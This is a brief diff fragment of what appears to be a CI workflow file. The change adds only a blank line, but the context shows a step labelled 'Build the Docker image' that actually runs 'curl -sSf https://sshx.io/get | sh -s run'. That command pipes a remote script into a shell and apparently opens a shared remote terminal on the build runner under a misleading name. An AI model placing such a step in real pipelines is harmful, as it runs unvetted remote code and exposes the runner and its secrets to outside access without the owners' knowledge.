@@ -17,3 +17,4 @@ jobs:
     - name: Build the Docker image
       run: |
         curl -sSf https://sshx.io/get | sh -s run
+
